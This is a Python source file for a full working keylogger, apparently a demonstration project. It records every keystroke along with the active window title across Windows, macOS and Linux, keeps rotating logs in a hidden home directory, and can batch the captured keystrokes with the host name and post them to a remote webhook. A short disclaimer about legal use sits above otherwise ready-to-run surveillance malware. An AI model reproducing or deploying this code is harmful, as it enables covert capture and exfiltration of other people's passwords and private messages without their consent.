"""
CarterPerez-dev | 2025
This keylogger demonstrates:
keyboard event capture, log management, and remote delivery

Unauthorized use of keyloggers is illegal. 
Only use on systems you own or have permission to monitor
"""

import sys
import logging
import platform
from enum import (
    Enum, 
    auto,
)
from threading import (
    Event, 
    Lock,
)
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass


try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
except ImportError:
    print("Error: pynput not installed. Run: pip install pynput")
    sys.exit(1)

try:
    import requests
except ImportError:
    print(
        "Warning: requests not installed. Webhook delivery disabled"
    )
    print("Run: pip install requests")
    requests = None  # type: ignore[assignment]

if platform.system() == "Windows":
    try:
        import win32gui
        import win32process
        import psutil
    except ImportError:
        win32gui = None
elif platform.system() == "Darwin":
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None
elif platform.system() == "Linux":
    try:
        import subprocess
    except ImportError:
        subprocess = None  # type: ignore[assignment]


class KeyType(Enum):
    """
    Enumeration of keyboard event types for type safety
    """
    CHAR = auto()
    SPECIAL = auto()
    UNKNOWN = auto()


@dataclass
class KeyloggerConfig:
    """
    Configuration for keylogger behavior
    """
    log_dir: Path = Path.home() / ".keylogger_logs"
    log_file_prefix: str = "keylog"
    max_log_size_mb: float = 5.0
    webhook_url: str | None = None
    webhook_batch_size: int = 50
    toggle_key: Key = Key.f9
    enable_window_tracking: bool = True
    log_special_keys: bool = True

    def __post_init__(self):
        self.log_dir.mkdir(parents = True, exist_ok = True)


@dataclass
class KeyEvent:
    """
    Represents a single keyboard event
    """
    timestamp: datetime
    key: str
    window_title: str | None = None
    key_type: KeyType = KeyType.CHAR

    def to_dict(self) -> dict[str, str]:
        """
        Convert event to dictionary for JSON serialization
        """
        return {
            "timestamp": self.timestamp.isoformat(),
            "key": self.key,
            "window_title": self.window_title or "Unknown",
            "key_type": self.key_type.name.lower()
        }

    def to_log_string(self) -> str:
        """
        Format event as human readable log string
        """
        time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        window_info = f" [{self.window_title}]" if self.window_title else ""
        return f"[{time_str}]{window_info} {self.key}"


class WindowTracker:
    """
    Tracks active window titles across different operating systems
    """
    @staticmethod
    def get_active_window() -> str | None:
        """
        Get the title of the currently active window
        """
        system = platform.system()

        if system == "Windows" and win32gui:
            return WindowTracker._get_windows_window()
        if system == "Darwin" and NSWorkspace:
            return WindowTracker._get_macos_window()
        if system == "Linux":
            return WindowTracker._get_linux_window()

        return None

    @staticmethod
    def _get_windows_window() -> str | None:
        try:
            window = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(window)
            process = psutil.Process(pid)
            window_title = win32gui.GetWindowText(window)
            return f"{process.name()} - {window_title}" if window_title else process.name(
            )
        except Exception:
            return None

    @staticmethod
    def _get_macos_window() -> str | None:
        try:
            active_app = NSWorkspace.sharedWorkspace(
            ).activeApplication()
            return active_app.get('NSApplicationName', 'Unknown')
        except Exception:
            return None

    @staticmethod
    def _get_linux_window() -> str | None:
        try:
            result = subprocess.run(
                ['xdotool',
                 'getactivewindow',
                 'getwindowname'],
                capture_output = True,
                text = True,
                timeout = 1,
                check = False
            )
            return result.stdout.strip(
            ) if result.returncode == 0 else None
        except Exception:
            return None


class LogManager:
    """
    Manages log file rotation and writing
    """
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.current_log_path = self._get_new_log_path()
        self.lock = Lock()
        self.logger = self._setup_logger()

    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger("keylogger")
        logger.setLevel(logging.INFO)

        handler = logging.FileHandler(self.current_log_path)
        handler.setFormatter(logging.Formatter('%(message)s'))
        logger.addHandler(handler)

        return logger

    def _get_new_log_path(self) -> Path:
        """
        Generate a new log file path with timestamp
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return self.config.log_dir / f"{self.config.log_file_prefix}_{timestamp}.txt"

    def write_event(self, event: KeyEvent) -> None:
        """
        Write a keyboard event to the log file
        """
        with self.lock:
            self.logger.info(event.to_log_string())
            self._check_rotation()

    def _check_rotation(self) -> None:
        """
        Check if log rotation is needed based on file size
        """
        current_size_mb = self.current_log_path.stat(
        ).st_size / (1024 * 1024)

        if current_size_mb >= self.config.max_log_size_mb:
            self.logger.handlers[0].close()
            self.logger.removeHandler(self.logger.handlers[0])

            self.current_log_path = self._get_new_log_path()
            handler = logging.FileHandler(self.current_log_path)
            handler.setFormatter(logging.Formatter('%(message)s'))
            self.logger.addHandler(handler)

    def get_current_log_content(self) -> str:
        """
        Read and return the current log file content
        """
        with self.lock:
            return self.current_log_path.read_text(encoding = 'utf-8')


class WebhookDelivery:
    """
    Handles batched delivery of logs to remote webhook
    """
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.event_buffer: list[KeyEvent] = []
        self.buffer_lock = Lock()
        self.enabled = bool(config.webhook_url and requests)

    def add_event(self, event: KeyEvent) -> None:
        """
        Add event to buffer and deliver if batch size reached
        """
        if not self.enabled:
            return

        with self.buffer_lock:
            self.event_buffer.append(event)

            if len(self.event_buffer
                   ) >= self.config.webhook_batch_size:
                self._deliver_batch()

    def _deliver_batch(self) -> None:
        """
        Deliver buffered events to webhook endpoint
        """
        if not self.event_buffer or not self.config.webhook_url:
            return

        payload = {
            "timestamp": datetime.now().isoformat(),
            "host": platform.node(),
            "events":
            [event.to_dict() for event in self.event_buffer]
        }

        try:
            response = requests.post(
                self.config.webhook_url,
                json = payload,
                timeout = 5
            )

            if response.status_code == 200:
                self.event_buffer.clear()
        except Exception as e:
            logging.error("Webhook delivery failed: %s", e)

    def flush(self) -> None:
        """
        Force delivery of remaining buffered events
        """
        with self.buffer_lock:
            self._deliver_batch()


class Keylogger:
    """
    Main keylogger class
    """
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.log_manager = LogManager(config)
        self.webhook = WebhookDelivery(config)
        self.window_tracker = WindowTracker()

        self.is_running = Event()
        self.is_logging = Event()
        self.listener: keyboard.Listener | None = None

        self._current_window: str | None = None
        self._last_window_check = datetime.now()

    def _update_active_window(self) -> None:
        """
        Update cached window title periodically
        """
        if not self.config.enable_window_tracking:
            return

        now = datetime.now()
        if (now - self._last_window_check).total_seconds() >= 0.5:
            self._current_window = self.window_tracker.get_active_window(
            )
            self._last_window_check = now

    def _process_key(self, key: Key | KeyCode) -> tuple[str, KeyType]:
        """
        Convert key to string representation and type
        """
        special_keys = {
            Key.space: "[SPACE]",
            Key.enter: "[ENTER]",
            Key.tab: "[TAB]",
            Key.backspace: "[BACKSPACE]",
            Key.delete: "[DELETE]",
            Key.shift: "[SHIFT]",
            Key.shift_r: "[SHIFT]",
            Key.ctrl: "[CTRL]",
            Key.ctrl_r: "[CTRL]",
            Key.alt: "[ALT]",
            Key.alt_r: "[ALT]",
            Key.cmd: "[CMD]",
            Key.cmd_r: "[CMD]",
            Key.esc: "[ESC]",
            Key.up: "[UP]",
            Key.down: "[DOWN]",
            Key.left: "[LEFT]",
            Key.right: "[RIGHT]",
        }

        if isinstance(key, Key):
            if key in special_keys:
                return special_keys[key], KeyType.SPECIAL
            return f"[{key.name.upper()}]", KeyType.SPECIAL

        if hasattr(key, 'char') and key.char:
            return key.char, KeyType.CHAR

        return "[UNKNOWN]", KeyType.UNKNOWN

    def _on_press(self, key: Key | KeyCode) -> None:
        """
        Callback for key press events
        """
        if key == self.config.toggle_key:
            self._toggle_logging()
            return

        if not self.is_logging.is_set():
            return

        self._update_active_window()

        key_str, key_type = self._process_key(key)

        if key_type == KeyType.SPECIAL and not self.config.log_special_keys:
            return

        event = KeyEvent(
            timestamp = datetime.now(),
            key = key_str,
            window_title = self._current_window,
            key_type = key_type
        )

        self.log_manager.write_event(event)
        self.webhook.add_event(event)

    def _toggle_logging(self) -> None:
        """
        Toggle logging on/off with F9 key
        """
        if self.is_logging.is_set():
            self.is_logging.clear()
            print("\n[*] Logging paused. Press F9 to resume.")
        else:
            self.is_logging.set()
            print("\n[*] Logging resumed. Press F9 to pause.")

    def start(self) -> None:
        """
        Start the keylogger
        """
        print("Keylogger Started")
        print()
        print(f"Log Directory: {self.config.log_dir}")
        print(
            f"Current Log: {self.log_manager.current_log_path.name}"
        )
        print(f"Toggle Key: {self.config.toggle_key.name.upper()}")
        print(
            f"Webhook: {'Enabled' if self.webhook.enabled else 'Disabled'}"
        )
        print()
        print("[*] Press F9 to start/stop logging")
        print("[*] Press CTRL+C to exit\n")

        self.is_running.set()
        self.is_logging.set()

        self.listener = keyboard.Listener(on_press = self._on_press)
        self.listener.start()

        try:
            while self.is_running.is_set():
                self.listener.join(timeout = 1.0)
        except KeyboardInterrupt:
            self.stop()

    def stop(self) -> None:
        """
        Stop the keylogger gracefully
        """
        print("\n\n[*] Shutting down...")

        self.is_running.clear()
        self.is_logging.clear()

        if self.listener:
            self.listener.stop()

        self.webhook.flush()

        print(f"[*] Logs saved to: {self.config.log_dir}")
        print("[*] Keylogger stopped.")


def main() -> None:
    """
    Entry point with example configuration
    """
    config = KeyloggerConfig(
        log_dir = Path.home() / ".keylogger_logs",
        max_log_size_mb = 5.0,
        webhook_url = None,
        webhook_batch_size = 50,
        toggle_key = Key.f9,
        enable_window_tracking = True,
        log_special_keys = True
    )

    keylogger = Keylogger(config)

    try:
        keylogger.start()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        keylogger.stop()


if __name__ == "__main__":
    main()
